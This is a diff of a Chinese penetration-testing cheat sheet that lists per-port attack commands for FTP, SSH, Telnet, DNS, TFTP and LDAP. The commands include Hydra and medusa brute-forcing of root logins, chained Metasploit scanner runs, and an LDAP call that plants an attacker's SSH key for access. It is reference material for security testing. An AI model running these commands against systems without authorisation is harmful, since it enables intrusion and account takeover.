@@ -538,75 +538,75 @@
 </tr>
 </tbody></table>
 <hr>
-<h3 id="21-FTP"><a href="#21-FTP" class="headerlink" title="21-FTP"></a>21-FTP</h3><h4 id="Banner-抓取"><a href="#Banner-抓取" class="headerlink" title="Banner 抓取"></a>Banner 抓取</h4><pre class="line-numbers language-none"><code class="language-none">nc -vn &lt;IP&gt; 21
+<h3 id="21-FTP"><a href="#21-FTP" class="headerlink" title="21-FTP"></a>21-FTP</h3><h4 id="Banner-抓取"><a href="#Banner-抓取" class="headerlink" title="Banner 抓取"></a>Banner 抓取</h4><pre class="language-none"><code class="language-none">nc -vn &lt;IP&gt; 21
 
-telnet -n &#123;IP&#125; 21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="匿名登录"><a href="#匿名登录" class="headerlink" title="匿名登录"></a>匿名登录</h4><pre class="line-numbers language-none"><code class="language-none">ftp &lt;IP&gt;
+telnet -n &#123;IP&#125; 21</code></pre>
+<h4 id="匿名登录"><a href="#匿名登录" class="headerlink" title="匿名登录"></a>匿名登录</h4><pre class="language-none"><code class="language-none">ftp &lt;IP&gt;
 &gt;anonymous
 &gt;anonymous
 &gt;ls -a  # List all files (even hidden) (yes, they could be hidden)
 &gt;binary #Set transmission to binary instead of ascii
 &gt;ascii  #Set transmission to ascii instead of binary
-&gt;bye    #exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><pre class="line-numbers language-none"><code class="language-none">wget -m ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.1     #Donwload all
-wget -m --no-passive ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.1 #Download all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="浏览器连接"><a href="#浏览器连接" class="headerlink" title="浏览器连接"></a>浏览器连接</h4><pre class="line-numbers language-none"><code class="language-none">ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="渗透方式"><a href="#渗透方式" class="headerlink" title="渗透方式"></a>渗透方式</h4><pre class="line-numbers language-none"><code class="language-none">1) nmap ftp
+&gt;bye    #exit</code></pre>
+<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><pre class="language-none"><code class="language-none">wget -m ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.1     #Donwload all
+wget -m --no-passive ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.1 #Download all</code></pre>
+<h4 id="浏览器连接"><a href="#浏览器连接" class="headerlink" title="浏览器连接"></a>浏览器连接</h4><pre class="language-none"><code class="language-none">ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.1</code></pre>
+<h4 id="渗透方式"><a href="#渗透方式" class="headerlink" title="渗透方式"></a>渗透方式</h4><pre class="language-none"><code class="language-none">1) nmap ftp
 nmap --script ftp-* -p 21 &#123;IP&#125;
 
 2) Hydra Brute Force
 hydra -t 1 -l &#123;Username&#125; -P &#123;Big_Passwordlist&#125; -vV &#123;IP&#125; ftp
 
 3) consolesless mfs enumeration ftp
-msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;bison_ftp_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;colorado_ftp_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp;  msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;titanftp_xcrc_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp
+msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;bison_ftp_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;colorado_ftp_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39; &amp;&amp;  msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;titanftp_xcrc_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#39;</code></pre>
+<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp
 ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-ftp">https://book.hacktricks.xyz/pentesting/pentesting-ftp</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</a></li>
 </ul>
-<h3 id="22-SSH-x2F-SFTP"><a href="#22-SSH-x2F-SFTP" class="headerlink" title="22-SSH&#x2F;SFTP"></a>22-SSH&#x2F;SFTP</h3><h4 id="Banner抓取"><a href="#Banner抓取" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="line-numbers language-none"><code class="language-none">nc -vn &lt;IP&gt; 22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h4><pre class="line-numbers language-none"><code class="language-none">ssh -v ip -p port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="公钥收集"><a href="#公钥收集" class="headerlink" title="公钥收集"></a>公钥收集</h4><pre class="line-numbers language-none"><code class="language-none">ssh-keyscan -t rsa &lt;IP&gt; -p &lt;PORT&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="Nmap-渗透"><a href="#Nmap-渗透" class="headerlink" title="Nmap 渗透"></a>Nmap 渗透</h4><pre class="line-numbers language-none"><code class="language-none">nmap -p22 &lt;ip&gt; -sC   # 使用默认脚本
+<h3 id="22-SSH-x2F-SFTP"><a href="#22-SSH-x2F-SFTP" class="headerlink" title="22-SSH&#x2F;SFTP"></a>22-SSH&#x2F;SFTP</h3><h4 id="Banner抓取"><a href="#Banner抓取" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="language-none"><code class="language-none">nc -vn &lt;IP&gt; 22</code></pre>
+<h4 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h4><pre class="language-none"><code class="language-none">ssh -v ip -p port</code></pre>
+<h4 id="公钥收集"><a href="#公钥收集" class="headerlink" title="公钥收集"></a>公钥收集</h4><pre class="language-none"><code class="language-none">ssh-keyscan -t rsa &lt;IP&gt; -p &lt;PORT&gt;</code></pre>
+<h4 id="Nmap-渗透"><a href="#Nmap-渗透" class="headerlink" title="Nmap 渗透"></a>Nmap 渗透</h4><pre class="language-none"><code class="language-none">nmap -p22 &lt;ip&gt; -sC   # 使用默认脚本
 nmap -p22 &lt;ip&gt; -sV   # 检索版本
 nmap -p22 &lt;ip&gt; --script ssh2-enum-algos   # 检索支持的算法
 nmap -p22 &lt;ip&gt; --script ssh-hostkey --script-args ssh_hostkey&#x3D;full     # 检索弱密钥
-nmap -p22 &lt;ip&gt; --script ssh-auth-methods --script-args&#x3D;&quot;ssh.user&#x3D;root&quot; # 检查认证方式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="Msf-渗透"><a href="#Msf-渗透" class="headerlink" title="Msf 渗透"></a>Msf 渗透</h4><pre class="line-numbers language-none"><code class="language-none">msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use scanner&#x2F;ssh&#x2F;ssh_enumusers; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;juniper_backdoor; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">msf&gt; use scanner&#x2F;ssh&#x2F;ssh_enumusers
+nmap -p22 &lt;ip&gt; --script ssh-auth-methods --script-args&#x3D;&quot;ssh.user&#x3D;root&quot; # 检查认证方式</code></pre>
+<h4 id="Msf-渗透"><a href="#Msf-渗透" class="headerlink" title="Msf 渗透"></a>Msf 渗透</h4><pre class="language-none"><code class="language-none">msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use scanner&#x2F;ssh&#x2F;ssh_enumusers; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;juniper_backdoor; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#39;</code></pre>
+<h4 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">msf&gt; use scanner&#x2F;ssh&#x2F;ssh_enumusers
 hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh
 ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh
-patator ssh_login host&#x3D;&lt;ip&gt; port&#x3D;22 user&#x3D;root 0&#x3D;&#x2F;path&#x2F;passwords.txt password&#x3D;FILE0 -x ignore:mesg&#x3D;&#39;Authentication failed&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+patator ssh_login host&#x3D;&lt;ip&gt; port&#x3D;22 user&#x3D;root 0&#x3D;&#x2F;path&#x2F;passwords.txt password&#x3D;FILE0 -x ignore:mesg&#x3D;&#39;Authentication failed&#39;</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://community.turgensec.com/ssh-hacking-guide/">https://community.turgensec.com/ssh-hacking-guide/</a></li>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-ssh">https://book.hacktricks.xyz/pentesting/pentesting-ssh</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/arthepsy/ssh-audit">https://github.com/arthepsy/ssh-audit</a></li>
 </ul>
-<h3 id="23-Telnet"><a href="#23-Telnet" class="headerlink" title="23-Telnet"></a>23-Telnet</h3><h4 id="Banner抓取-1"><a href="#Banner抓取-1" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="line-numbers language-none"><code class="language-none">nc -vn &lt;IP&gt; 23
+<h3 id="23-Telnet"><a href="#23-Telnet" class="headerlink" title="23-Telnet"></a>23-Telnet</h3><h4 id="Banner抓取-1"><a href="#Banner抓取-1" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="language-none"><code class="language-none">nc -vn &lt;IP&gt; 23
 
-nmap -n -sV -Pn --script &quot;*telnet* and safe&quot; -p 23 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h4><pre class="line-numbers language-none"><code class="language-none">nmap -n -sV -Pn --script &quot;*telnet*&quot; -p 23 &#123;IP&#125;
+nmap -n -sV -Pn --script &quot;*telnet* and safe&quot; -p 23 &lt;IP&gt;</code></pre>
+<h4 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h4><pre class="language-none"><code class="language-none">nmap -n -sV -Pn --script &quot;*telnet*&quot; -p 23 &#123;IP&#125;
 
-msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;brocade_enable_login; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_encrypt_overflow; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_ruggedcom; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-2"><a href="#暴力破解-2" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet
+msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;brocade_enable_login; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_encrypt_overflow; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_ruggedcom; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#39;</code></pre>
+<h4 id="暴力破解-2"><a href="#暴力破解-2" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet
 ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-telnet">https://book.hacktricks.xyz/pentesting/pentesting-telnet</a></li>
 </ul>
-<h3 id="53-DNS"><a href="#53-DNS" class="headerlink" title="53-DNS"></a>53-DNS</h3><h4 id="Banner抓取-2"><a href="#Banner抓取-2" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="line-numbers language-none"><code class="language-none">dig version.bind CHAOS TXT @DNS
+<h3 id="53-DNS"><a href="#53-DNS" class="headerlink" title="53-DNS"></a>53-DNS</h3><h4 id="Banner抓取-2"><a href="#Banner抓取-2" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="language-none"><code class="language-none">dig version.bind CHAOS TXT @DNS
 
-nmap -n -sV -Pn --script dns-nsid -p 53 &#123;IP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h4><pre class="line-numbers language-none"><code class="language-none">dig axfr @&lt;DNS_IP&gt;           # 尝试无域名的域传送
+nmap -n -sV -Pn --script dns-nsid -p 53 &#123;IP&#125;</code></pre>
+<h4 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h4><pre class="language-none"><code class="language-none">dig axfr @&lt;DNS_IP&gt;           # 尝试无域名的域传送
 dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;  # 域传送猜解域名
-fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;DNS_IP&gt;  # 尝试对每个权威服务器执行域传输，如不行则发起字典攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="Dig-利用"><a href="#Dig-利用" class="headerlink" title="Dig 利用"></a>Dig 利用</h4><pre class="line-numbers language-none"><code class="language-none">dig ANY @&lt;DNS_IP&gt; &lt;DOMAIN&gt;     #Any information
+fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;DNS_IP&gt;  # 尝试对每个权威服务器执行域传输，如不行则发起字典攻击</code></pre>
+<h4 id="Dig-利用"><a href="#Dig-利用" class="headerlink" title="Dig 利用"></a>Dig 利用</h4><pre class="language-none"><code class="language-none">dig ANY @&lt;DNS_IP&gt; &lt;DOMAIN&gt;     #Any information
 dig A @&lt;DNS_IP&gt; &lt;DOMAIN&gt;       #Regular DNS request
 dig AAAA @&lt;DNS_IP&gt; &lt;DOMAIN&gt;    #IPv6 DNS request
 dig TXT @&lt;DNS_IP&gt; &lt;DOMAIN&gt;     #Information
@@ -615,52 +615,52 @@ dig NS @&lt;DNS_IP&gt; &lt;DOMAIN&gt;      #DNS that resolves that name
 dig -x 192.168.0.2 @&lt;DNS_IP&gt;   #Reverse lookup
 dig -x 2a00:1450:400c:c06::93 @&lt;DNS_IP&gt; #reverse IPv6 lookup
 
-#Use [-p PORT]  or  -6 (to use ivp6 address of dns)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="DNS反向爆破"><a href="#DNS反向爆破" class="headerlink" title="DNS反向爆破"></a>DNS反向爆破</h4><pre class="line-numbers language-none"><code class="language-none">dnsrecon -r 127.0.0.0&#x2F;24 -n &lt;IP_DNS&gt;  #DNS reverse of all of the addresses
+#Use [-p PORT]  or  -6 (to use ivp6 address of dns)</code></pre>
+<h4 id="DNS反向爆破"><a href="#DNS反向爆破" class="headerlink" title="DNS反向爆破"></a>DNS反向爆破</h4><pre class="language-none"><code class="language-none">dnsrecon -r 127.0.0.0&#x2F;24 -n &lt;IP_DNS&gt;  #DNS reverse of all of the addresses
 dnsrecon -r 127.0.1.0&#x2F;24 -n &lt;IP_DNS&gt;  #DNS reverse of all of the addresses
 dnsrecon -r &lt;IP_DNS&gt;&#x2F;24 -n &lt;IP_DNS&gt;   #DNS reverse of all of the addresses
-dnsrecon -d active.htb -a -n &lt;IP_DNS&gt; #Zone transfer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h4><pre class="line-numbers language-none"><code class="language-none">dnsrecon -D subdomains-1000.txt -d &lt;DOMAIN&gt; -n &lt;IP_DNS&gt;
-dnscan -d &lt;domain&gt; -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https:&#x2F;&#x2F;github.com&#x2F;rbsec&#x2F;dnscan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="渗透攻击-1"><a href="#渗透攻击-1" class="headerlink" title="渗透攻击"></a>渗透攻击</h4><pre class="line-numbers language-none"><code class="language-none">nmap -n --script &quot;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&quot; &#123;IP&#125;
+dnsrecon -d active.htb -a -n &lt;IP_DNS&gt; #Zone transfer</code></pre>
+<h4 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h4><pre class="language-none"><code class="language-none">dnsrecon -D subdomains-1000.txt -d &lt;DOMAIN&gt; -n &lt;IP_DNS&gt;
+dnscan -d &lt;domain&gt; -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https:&#x2F;&#x2F;github.com&#x2F;rbsec&#x2F;dnscan</code></pre>
+<h4 id="渗透攻击-1"><a href="#渗透攻击-1" class="headerlink" title="渗透攻击"></a>渗透攻击</h4><pre class="language-none"><code class="language-none">nmap -n --script &quot;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&quot; &#123;IP&#125;
 
-msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp; set RHOSTS &#123;IP&#125;; set RPORT 53; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;gather&#x2F;enum_dns; set RHOSTS &#123;IP&#125;; set RPORT 53; run; exit&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp; set RHOSTS &#123;IP&#125;; set RPORT 53; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;gather&#x2F;enum_dns; set RHOSTS &#123;IP&#125;; set RPORT 53; run; exit&#39;</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-dns">https://book.hacktricks.xyz/pentesting/pentesting-dns</a></li>
 </ul>
-<h3 id="69-TFTP"><a href="#69-TFTP" class="headerlink" title="69-TFTP"></a>69-TFTP</h3><h4 id="服务枚举"><a href="#服务枚举" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -n -Pn -sU -p69 -sV --script tftp-enum &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="下载上传"><a href="#下载上传" class="headerlink" title="下载上传"></a>下载上传</h4><pre class="line-numbers language-none"><code class="language-none">msf5&gt; auxiliary&#x2F;admin&#x2F;tftp&#x2F;tftp_transfer_util
+<h3 id="69-TFTP"><a href="#69-TFTP" class="headerlink" title="69-TFTP"></a>69-TFTP</h3><h4 id="服务枚举"><a href="#服务枚举" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap -n -Pn -sU -p69 -sV --script tftp-enum &lt;IP&gt;</code></pre>
+<h4 id="下载上传"><a href="#下载上传" class="headerlink" title="下载上传"></a>下载上传</h4><pre class="language-none"><code class="language-none">msf5&gt; auxiliary&#x2F;admin&#x2F;tftp&#x2F;tftp_transfer_util
 
 ---
 
 import tftpy
 client &#x3D; tftpy.TftpClient(&lt;ip&gt;, &lt;port&gt;)
 client.download(&quot;filename in server&quot;, &quot;&#x2F;tmp&#x2F;filename&quot;, timeout&#x3D;5)
-client.upload(&quot;filename to upload&quot;, &quot;&#x2F;local&#x2F;path&#x2F;file&quot;, timeout&#x3D;5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+client.upload(&quot;filename to upload&quot;, &quot;&#x2F;local&#x2F;path&#x2F;file&quot;, timeout&#x3D;5)</code></pre>
 
-<h3 id="389-x2F-636-LDAP"><a href="#389-x2F-636-LDAP" class="headerlink" title="389&#x2F;636-LDAP"></a>389&#x2F;636-LDAP</h3><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="line-numbers language-none"><code class="language-none">389（ldap） and 636（ldaps）
+<h3 id="389-x2F-636-LDAP"><a href="#389-x2F-636-LDAP" class="headerlink" title="389&#x2F;636-LDAP"></a>389&#x2F;636-LDAP</h3><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="language-none"><code class="language-none">389（ldap） and 636（ldaps）
 
 PORT    STATE SERVICE REASON
 389&#x2F;tcp open  ldap    syn-ack
-636&#x2F;tcp open  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="服务枚举-1"><a href="#服务枚举-1" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -n -sV --script &quot;ldap* and not brute&quot; &lt;IP&gt;   #Using anonymous credentials
+636&#x2F;tcp open  tcpwrapped</code></pre>
+<h4 id="服务枚举-1"><a href="#服务枚举-1" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap -n -sV --script &quot;ldap* and not brute&quot; &lt;IP&gt;   #Using anonymous credentials
 
-nmap -p 389 --script ldap-search -Pn &#123;IP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h4><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; import ldap3
+nmap -p 389 --script ldap-search -Pn &#123;IP&#125;</code></pre>
+<h4 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h4><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import ldap3
 &gt;&gt;&gt; server &#x3D; ldap3.Server(&#39;x.x.x.x&#39;, port &#x3D;636, use_ssl &#x3D; True)
 &gt;&gt;&gt; connection &#x3D; ldap3.Connection(server, &#39;uid&#x3D;USER,ou&#x3D;USERS,dc&#x3D;DOMAIN,dc&#x3D;DOMAIN&#39;, &#39;PASSWORD&#39;, auto_bind&#x3D;True)
 &gt;&gt;&gt; connection.bind()
 True
 &gt;&gt;&gt; connection.extend.standard.who_am_i()
 u&#39;dn:uid&#x3D;USER,ou&#x3D;USERS,dc&#x3D;DOMAIN,dc&#x3D;DOMAIN&#39;
-&gt;&gt;&gt; connection.modify(&#39;uid&#x3D;USER,ou&#x3D;USERS,dc&#x3D;DOMAINM&#x3D;,dc&#x3D;DOMAIN&#39;,&#123;&#39;sshPublicKey&#39;: [(ldap3.MODIFY_REPLACE, [&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et&#x2F;B5bUyHkSANn2um9&#x2F;qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz&#x2F;EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o&#x2F;P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf&#x2F;l356r3dy&#x2F;oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH&#x2F;qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR&#x2F;WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF&#x2F;TnQ5N898RcKwll7mrvkbnGrknn+IT&#x2F;v3US19fPJWzl1&#x2F;pTqmAnkPThJW&#x2F;k&#x3D; badguy@evil&#39;])]&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="信息转储"><a href="#信息转储" class="headerlink" title="信息转储"></a>信息转储</h4><pre class="line-numbers language-none"><code class="language-none">pip3 install ldapdomaindump 
-ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u &#39;&lt;domain&gt;\&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; [--authtype SIMPLE] --no-json --no-grep [-o &#x2F;path&#x2F;dir]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-3"><a href="#暴力破解-3" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script ldap-brute -p 389 &lt;IP&gt;
